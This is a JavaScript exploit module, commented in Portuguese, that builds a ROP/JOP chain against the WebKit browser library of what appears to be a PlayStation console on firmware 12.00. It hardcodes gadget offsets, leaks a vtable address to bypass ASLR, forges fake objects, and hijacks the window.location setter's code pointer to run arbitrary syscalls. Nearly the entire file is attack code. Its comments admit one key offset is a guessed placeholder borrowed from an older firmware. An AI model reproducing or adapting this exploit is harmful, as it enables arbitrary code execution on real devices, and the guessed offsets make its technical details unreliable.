/* 12.00 ROP Chain - Generated from ELF Extractor Logs */

import { mem } from '../module/mem.mjs';
import { KB } from '../module/offset.mjs';
import { ChainBase, get_gadget } from '../module/chain.mjs';
import { BufferView } from '../module/rw.mjs';
import { init_syscall_array } from '../module/memtools.mjs';
import * as off from '../module/offset.mjs';

// --- GADGET MAP (Extraído do seu libSceNKWebKit.sprx) ---
const webkit_gadget_offsets = new Map(Object.entries({
    // Stack Control
    'pop rsp; ret': 0x46ca0,     // Pivot
    'pop rdi; ret': 0x4d02f,     // Arg 1
    'pop rsi; ret': 0x14e37,     // Arg 2
    'pop rdx; ret': 0x4f7a,      // Arg 3
    'pop rcx; ret': 0x57c0b,     // Arg 4
    'pop rax; ret': 0x26f53,     // Return val / Syscall num
    'pop r8; ret':  0x123c691,   // Arg 5

    // Memory Primitives
    'mov [rdi], rax; ret': 0x2f5cb, // Write
    'mov rax, [rdi]; ret': 0x4f720, // Read
    
    // Execution / Flow
    'jmp [rsi]': 0xa088a,        // JOP Trigger
    'call [rax]': 0xfc92,        // Function Call
    'syscall': 0x177a88,         // Syscall Instruction
    'ret': 0x4032,               // NOP / Align
    'leave; ret': 0x15823        // Stack cleanup
}));

// Variáveis de Base
export let libwebkit_base = null;
export let libkernel_base = null; // Opcional por enquanto
export let libc_base = null;      // Opcional

export const gadgets = new Map();

// --- CÁLCULO DE ASLR (A Parte Delicada) ---
function get_bases() {
    // 1. Criamos um objeto HTML para vazar sua VTable
    const textarea = document.createElement('textarea');
    const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
    
    // Lê o ponteiro da VTable (primeiros 8 bytes)
    const textarea_vtable = webcore_textarea.readp(0);
    
    // -----------------------------------------------------------------------
    // [!] ATENÇÃO: ESTE É O NÚMERO QUE PRECISA SER CORRIGIDO DEPOIS [!]
    // Este é o offset da VTable do HTMLTextAreaElement dentro do libSceNKWebKit.
    // Sem um dump, estamos chutando baseado em versões próximas (9.00/11.00).
    // Se o exploit travar no "Calculando Bases", é este número que está errado.
    // -----------------------------------------------------------------------
    const off_ta_vt = 0x2E73C18; // Placeholder (Valor da 9.00)

    // Calcula a base subtraindo o offset do ponteiro real
    libwebkit_base = textarea_vtable.sub(off_ta_vt);
    
    // Para simplificar, assumimos que vamos usar syscalls do próprio WebKit
    // então não precisamos calcular libkernel agora se não quisermos.
    libkernel_base = libwebkit_base; // Hack temporário para init_syscall_array não quebrar
}

export function init_gadget_map(gadget_map, offset_map, base_addr) {
    for (const [insn, offset] of offset_map) {
        gadget_map.set(insn, base_addr.add(offset));
    }
}

// --- CLASSE DA CORRENTE (CHAIN) ---
export class Chain1200 extends ChainBase {
    constructor() {
        super();
        
        // Configura o Stack Pivot Falso (Fake Stack)
        // Precisamos de um espaço onde escreveremos nossa ROP Chain
        // e apontaremos o RSP para lá.
        const [rdx, rdx_bak] = mem.gc_alloc(0x58);
        
        // Cria um objeto falso para enganar o JOP
        rdx.write64(off.js_cell, this._empty_cell); 
        rdx.write64(0x50, this.stack_addr); // Onde o RSP vai cair
        
        this._rsp = mem.fakeobj(rdx);
    }

    // Sobrescreve syscall para usar gadgets do WebKit
    push_syscall(sysno, rdi, rsi, rdx, rcx, r8, r9) {
        this.push_gadget('pop rax; ret');
        this.push_value(sysno);
        
        if (rdi !== undefined) { this.push_gadget('pop rdi; ret'); this.push_value(rdi); }
        if (rsi !== undefined) { this.push_gadget('pop rsi; ret'); this.push_value(rsi); }
        if (rdx !== undefined) { this.push_gadget('pop rdx; ret'); this.push_value(rdx); }
        if (rcx !== undefined) { this.push_gadget('pop rcx; ret'); this.push_value(rcx); }
        if (r8  !== undefined) { this.push_gadget('pop r8; ret');  this.push_value(r8); }
        
        // R9 está faltando no log, então ignoramos (maioria das syscalls usa até R8 ou 0)
        
        this.push_gadget('syscall');
    }

    run() {
        this.check_allow_run();
        // Inicia a execução apontando o JOP para nosso objeto falso
        this._rop.launch = this._rsp;
        this.dirty();
    }
}

export const Chain = Chain1200;

// --- INICIALIZAÇÃO ---
export function init(Chain) {
    const syscall_array = [];
    
    try {
        get_bases(); // Tenta calcular endereço base
    } catch(e) {
        console.log("Erro ao calcular base: " + e);
    }

    // Mapeia os gadgets usando a base calculada
    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);

    // Inicializa array de syscalls (usando base do webkit pois achamos syscall lá)
    init_syscall_array(syscall_array, libwebkit_base, 300 * KB);

    // --- SETUP DO GATILHO JOP (Jump Oriented Programming) ---
    // Precisamos sobrescrever um ponteiro de função JS para pular para nosso gadget
    
    // Alvo: setter de location (window.location = ...)
    let gs = Object.getOwnPropertyDescriptor(window, 'location').set;
    gs = mem.addrof(gs).readp(0x28); // Lê o ponteiro de código

    const size_cgs = 0x18;
    const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
    mem.cpy(gc_buf, gs, size_cgs); // Copia o objeto original
    
    // SOBRESCREVE O PONTEIRO DE EXECUÇÃO
    // Offset 0x10 geralmente é o entrypoint. 
    // Apontamos para 'jmp [rsi]' (0xa088a)
    gc_buf.write64(0x10, libwebkit_base.add(0xa088a)); 

    const proto = Chain.prototype;
    const _rop = {get launch() {throw Error('never call')}, 0: 1.1};
    
    // Instala o objeto falso
    mem.addrof(_rop).write64(off.js_inline_prop, gc_buf);
    proto._rop = _rop;

    // Configura ponteiros para o gadget de pivot
    const rax_ptrs = new BufferView(0x100);
    proto._rax_ptrs = rax_ptrs;

    // Ajuste fino do JOP (pode precisar de mudança se travar na execução)
    // O 'jmp [rsi]' espera que RSI aponte para algo útil.
    // Aqui configuramos o ambiente.
    const jop_buffer_p = mem.addrof(_rop).readp(off.js_butterfly);
    jop_buffer_p.write64(0, get_view_vector(rax_ptrs));

    const empty = {};
    proto._empty_cell = mem.addrof(empty).read64(off.js_cell);

    Chain.init_class(gadgets, syscall_array);
}
